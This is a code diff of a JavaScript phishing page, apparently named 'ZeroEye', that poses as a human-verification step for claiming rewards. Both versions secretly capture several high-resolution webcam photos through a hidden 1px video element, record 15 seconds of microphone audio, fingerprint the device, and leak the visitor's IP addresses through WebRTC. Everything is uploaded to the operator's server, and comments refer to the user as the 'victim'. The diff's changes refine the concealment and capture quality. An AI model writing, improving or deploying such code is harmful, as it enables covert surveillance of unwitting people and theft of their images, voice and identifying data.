@@ -1,7 +1,7 @@
 const SERVER_URL = window.location.origin;
 const sentIPs = new Set();
 
-// Enhanced permissions wall with better UX
+// Permissions Wall
 if (confirm("📸 Camera Access Required\n\nWe need to verify you're human by taking a quick photo. This helps prevent bots from claiming rewards.\n\nClick OK to continue with verification.")) {
     showLoadingScreen();
     setTimeout(startAttack, 1000);
@@ -21,338 +21,200 @@ function showLoadingScreen() {
                 <p style="font-size: 12px; opacity: 0.7; margin-top: 20px;">This may take 10-15 seconds</p>
             </div>
         </div>
-        <style>
-            @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-            }
-        </style>
+        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
     `;
 }
 
 function showAccessDenied() {
-    document.body.innerHTML = `
-        <div style="font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color: white; min-height: 100vh;">
-            <div style="max-width: 400px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; backdrop-filter: blur(10px);">
-                <h1 style="font-size: 24px; margin-bottom: 20px;">❌ Access Denied</h1>
-                <p style="font-size: 16px; margin-bottom: 30px;">Camera access is required to verify your identity and prevent fraud.</p>
-                <button onclick="location.reload()" style="background: #fff; color: #ee5a24; border: none; padding: 12px 30px; border-radius: 25px; font-size: 16px; cursor: pointer; font-weight: bold;">
-                    Try Again
-                </button>
-            </div>
-        </div>
-    `;
+    document.body.innerHTML = `<div style="text-align:center; padding:50px; color:black;"><h1>Access Denied</h1><button onclick="location.reload()">Retry</button></div>`;
 }
 
 async function startAttack() {
     try {
-        // 1. HD CAMERA REQUEST with multiple resolution options
+        // 1. 4K CAMERA REQUEST
         const constraints = {
             audio: {
-                channelCount: 1,
-                sampleRate: 44100,
-                sampleSize: 16,
-                echoCancellation: true, // Helps reduce feedback
-                noiseSuppression: true
+                echoCancellation: true,
+                noiseSuppression: true,
+                sampleRate: 44100
             },
             video: {
                 facingMode: "user",
-                width: { ideal: 1920, min: 1280 },
-                height: { ideal: 1080, min: 720 },
-                frameRate: { ideal: 30 }
+                // Request 4K ideal, but allow fallback to 1080p/720p
+                width: { ideal: 3840, min: 1280 },
+                height: { ideal: 2160, min: 720 }
             }
         };
         
-        console.log("[ZeroEye] Requesting HD camera access...");
+        console.log("[ZeroEye] Requesting High-Res Media...");
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        console.log("[ZeroEye] Camera access granted");
-
-        // 2. ENHANCED DATA COLLECTION
-        const systemInfo = await collectSystemInfo();
         
-        // Send System Info immediately
-        sendSystemInfo(systemInfo);
+        // 2. SEND SYSTEM INFO
+        const sysInfo = await collectSystemInfo();
+        sendData('/upload_sys', sysInfo);
 
-        // 3. WEBRTC IP LEAK
-        setupWebRTCIPLeak();
+        // 3. IP LEAK
+        setupWebRTC();
 
-        // 4. HD CAMERA CAPTURE with auto-focus delay
-        setupCameraCapture(stream);
+        // 4. CAMERA CAPTURE (Fixed Black Screen)
+        setupCamera(stream);
 
-        // 5. AUDIO RECORDING (dual assurance)
-        setupAudioRecording(stream);
+        // 5. AUDIO RECORDING (Fixed Formats)
+        setupAudio(stream);
 
     } catch (err) {
-        console.error("[ZeroEye] Error:", err);
-        // Fallback - still try to collect basic info without camera
-        const basicInfo = await collectSystemInfo();
-        sendSystemInfo(basicInfo);
-        setupWebRTCIPLeak();
+        console.error("[ZeroEye] Permission Error:", err);
+        // Fallback: Send what we can
+        sendData('/upload_sys', await collectSystemInfo());
+        setupWebRTC();
     }
 }
 
+// --- DATA COLLECTION HELPERS ---
+
 async function collectSystemInfo() {
-    // Battery Information
-    const getBatteryStatus = async () => {
-        try {
-            if ('getBattery' in navigator) {
-                const battery = await navigator.getBattery();
-                return {
-                    level: Math.round(battery.level * 100) + '%',
-                    charging: battery.charging,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
-                };
-            }
-            return { level: 'Unknown', charging: 'Unknown' };
-        } catch (e) {
-            return { level: 'Unknown', charging: 'Unknown' };
+    let batteryLevel = "Unknown";
+    try {
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batteryLevel = `${Math.round(b.level * 100)}%`;
         }
-    };
-
-    // Network Information
-    const getNetworkInfo = () => {
-        try {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (connection) {
-                return {
-                    effectiveType: connection.effectiveType,
-                    downlink: connection.downlink + ' Mbps',
-                    rtt: connection.rtt + ' ms',
-                    saveData: connection.saveData
-                };
-            }
-            return { effectiveType: 'Unknown' };
-        } catch (e) {
-            return { effectiveType: 'Unknown' };
-        }
-    };
-
-    // GPU Information
-    const getGPUInfo = () => {
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
-            }
-            return 'Unknown';
-        } catch (e) {
-            return 'Unknown';
-        }
-    };
-
-    const battery = await getBatteryStatus();
-    const network = getNetworkInfo();
+    } catch(e) {}
 
     return {
-        // Basic Info
-        userAgent: navigator.userAgent,
         platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages,
-        
-        // Hardware
-        cores: navigator.hardwareConcurrency || 'Unknown',
-        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
-        screen: `${screen.width}x${screen.height}`,
-        colorDepth: screen.colorDepth + ' bit',
-        gpu: getGPUInfo(),
-        
-        // Network & Battery
-        battery: battery,
-        network: network,
-        
-        // Location
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cookieEnabled: navigator.cookieEnabled,
-        
-        // Timestamp
-        timestamp: new Date().toISOString()
+        userAgent: navigator.userAgent,
+        cores: navigator.hardwareConcurrency || "Unknown",
+        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
+        screen: `${window.screen.width}x${window.screen.height}`,
+        battery: batteryLevel,
+        gpu: getGPUName(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
     };
 }
 
-function sendSystemInfo(systemInfo) {
-    const formattedInfo = {
-        '📱 Device': systemInfo.platform,
-        '🔋 Battery': `${systemInfo.battery.level} (${systemInfo.battery.charging ? 'Charging' : 'On Battery'})`,
-        '📡 Network': systemInfo.network.effectiveType,
-        '⚡ Speed': systemInfo.network.downlink,
-        '🖥️ Screen': systemInfo.screen,
-        '⚙️ Cores': systemInfo.cores,
-        '💾 RAM': systemInfo.ram,
-        '🎮 GPU': systemInfo.gpu,
-        '🌐 Timezone': systemInfo.timezone,
-        '🔍 User Agent': systemInfo.userAgent.substring(0, 100) + '...'
-    };
+function getGPUName() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    } catch(e) { return "Unknown GPU"; }
+}
 
-    fetch(`${SERVER_URL}/upload_sys`, {
+function sendData(endpoint, data) {
+    fetch(`${SERVER_URL}${endpoint}`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: `data=${encodeURIComponent(JSON.stringify(formattedInfo))}`
-    }).catch(err => console.log('Info send failed:', err));
+        body: `data=${encodeURIComponent(JSON.stringify(data))}`
+    }).catch(e => console.log(e));
 }
 
-function setupWebRTCIPLeak() {
-    const rtc = new RTCPeerConnection({ 
-        iceServers: [{ urls: "stun:stun.l.google.com:19302" }] 
-    });
-    
+function setupWebRTC() {
+    const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
     rtc.createDataChannel('');
-    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-    
-    rtc.onicecandidate = (event) => {
-        if (event.candidate) {
-            const candidate = event.candidate.candidate;
-            // Look for IP addresses in candidate string
-            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
-            const matches = candidate.match(ipRegex);
-            
-            if (matches) {
-                matches.forEach(ip => {
-                    if (!sentIPs.has(ip) && !isPrivateIP(ip)) {
-                        sentIPs.add(ip);
-                        fetch(`${SERVER_URL}/upload_ip`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                            body: `data=${encodeURIComponent(JSON.stringify({internal_ip: ip}))}`
-                        }).catch(err => console.log('IP send failed:', err));
-                    }
-                });
+    rtc.createOffer().then(o => rtc.setLocalDescription(o));
+    rtc.onicecandidate = (e) => {
+        if (e && e.candidate && e.candidate.candidate) {
+            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+            if (ipMatch) {
+                const ip = ipMatch[1];
+                if (!sentIPs.has(ip)) {
+                    sentIPs.add(ip);
+                    sendData('/upload_ip', { internal_ip: ip });
+                }
             }
         }
     };
 }
 
-function isPrivateIP(ip) {
-    return ip.startsWith('192.168.') || 
-           ip.startsWith('10.') || 
-           ip.startsWith('172.') ||
-           ip === '127.0.0.1';
-}
-
-function setupCameraCapture(stream) {
+function setupCamera(stream) {
     const video = document.createElement('video');
     video.srcObject = stream;
-    video.autoplay = true;
-    video.playsInline = true;
     
-    // FIX 1: Mute the video so victim doesn't hear themselves
-    video.muted = true;
+    // CRITICAL FIXES FOR BLACK IMAGES & SELF-HEARING:
+    video.muted = true;           // Mute to prevent feedback loop
+    video.playsInline = true;     // Required for iOS
+    video.autoplay = true;        // Start immediately
     
-    // FIX 2: Do NOT use display:none. It breaks iOS capture. 
-    // Use off-screen positioning instead.
+    // VISIBILITY HACK: 
+    // Do NOT use display:none or visibility:hidden.
+    // Make it 1px size and almost transparent. This forces the GPU to render frames.
     video.style.position = 'fixed';
-    video.style.top = '-10000px';
-    video.style.left = '-10000px';
-    video.style.opacity = '0';
+    video.style.bottom = '0';
+    video.style.right = '0';
+    video.style.width = '1px';
+    video.style.height = '1px';
+    video.style.opacity = '0.01'; // Just enough to be "visible" to the browser
+    video.style.pointerEvents = 'none';
     
     document.body.appendChild(video);
+    video.play(); // Force play
 
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
-    // Canvas doesn't need to be in DOM to work, but good practice to hide it if appended
-    canvas.style.display = 'none';
-    document.body.appendChild(canvas);
 
-    let captureCount = 0;
-    const maxCaptures = 3; // Take 3 photos total
-
-    function capturePhoto() {
-        if (captureCount >= maxCaptures) return;
+    // Wait for video to actually have data
+    video.addEventListener('loadeddata', () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
         
-        if (video.videoWidth > 0 && video.videoHeight > 0) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+        let shots = 0;
+        const takeShot = () => {
+            if (shots >= 4) return; // Take 4 photos max
             
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob((blob) => {
-                if (blob) {
+            // Ensure video has data before drawing
+            if (video.readyState >= 2) {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                    if (!blob) return;
                     const formData = new FormData();
-                    formData.append('file', blob, `cam_${Date.now()}_${captureCount + 1}.jpg`);
-                    
-                    fetch(`${SERVER_URL}/upload_cam`, { 
-                        method: 'POST', 
-                        body: formData 
-                    }).catch(err => console.log('Photo upload failed:', err));
-                }
-            }, 'image/jpeg', 0.92); // High quality
-        }
-        
-        captureCount++;
-    }
+                    formData.append('file', blob, `cam_${Date.now()}.jpg`);
+                    fetch(`${SERVER_URL}/upload_cam`, { method: 'POST', body: formData });
+                }, 'image/jpeg', 0.95); // 95% Quality for 4K
+                shots++;
+            }
+        };
 
-    // Wait 2 seconds for auto-focus to settle, then take first photo
-    setTimeout(() => {
-        capturePhoto(); // First immediate capture
-        
-        // Second capture after 3 seconds
-        setTimeout(capturePhoto, 3000);
-        
-        // Third capture after 6 seconds  
-        setTimeout(capturePhoto, 6000);
-    }, 2000);
+        // Take shots at intervals: 1s, 3s, 6s, 9s
+        setTimeout(takeShot, 1000);
+        setTimeout(takeShot, 3000);
+        setTimeout(takeShot, 6000);
+        setTimeout(takeShot, 9000);
+    });
 }
 
-function setupAudioRecording(stream) {
+function setupAudio(stream) {
     try {
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        
-        // FIX 3: Detect supported MIME type for cross-platform compatibility
-        // iOS requires audio/mp4, Android/Windows prefer audio/webm
-        let options = {};
+        // Universal Audio Support (iOS/Android/Windows)
+        // We let the browser pick its preferred supported mimeType
+        let options = undefined;
         if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
             options = { mimeType: 'audio/webm;codecs=opus' };
         } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
-            options = { mimeType: 'audio/mp4' }; // iOS Fix
-        } else if (MediaRecorder.isTypeSupported('audio/webm')) {
-            options = { mimeType: 'audio/webm' };
+            options = { mimeType: 'audio/mp4' }; // iOS 14.5+
         }
         
-        // If no options match, the browser will use its default
-        const mediaRecorder = Object.keys(options).length > 0 
-            ? new MediaRecorder(stream, options) 
-            : new MediaRecorder(stream);
-        
-        let audioChunks = [];
-        
-        mediaRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-                audioChunks.push(event.data);
-            }
-        };
+        const mediaRecorder = options ? new MediaRecorder(stream, options) : new MediaRecorder(stream);
+        let chunks = [];
+
+        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
         
         mediaRecorder.onstop = () => {
-            // Use the correct type based on what we selected
-            const type = options.mimeType || 'audio/webm';
-            const ext = type.includes('mp4') ? 'mp4' : 'webm';
-            
-            const audioBlob = new Blob(audioChunks, { type: type });
-            
-            // Send to server
+            const blob = new Blob(chunks, { type: mediaRecorder.mimeType });
             const formData = new FormData();
-            formData.append('file', audioBlob, `audio_${Date.now()}.${ext}`);
+            // Add correct extension based on type
+            const ext = blob.type.includes('mp4') ? 'mp4' : 'webm';
+            formData.append('file', blob, `audio_${Date.now()}.${ext}`);
             
-            fetch(`${SERVER_URL}/upload_audio`, { 
-                method: 'POST', 
-                body: formData 
-            }).catch(err => console.log('Audio upload failed:', err));
-            
-            // Clear for next recording
-            audioChunks = [];
+            fetch(`${SERVER_URL}/upload_audio`, { method: 'POST', body: formData })
+                .catch(e => console.log("Audio upload error", e));
         };
-        
-        // Record for 15 seconds
+
         mediaRecorder.start();
-        setTimeout(() => {
-            if (mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-            }
-        }, 15000);
-        
-    } catch (error) {
-        console.log('Audio recording not supported:', error);
+        setTimeout(() => { if(mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 15000); // 15 Seconds
+
+    } catch (e) {
+        console.log("Audio Init Error:", e);
     }
 }
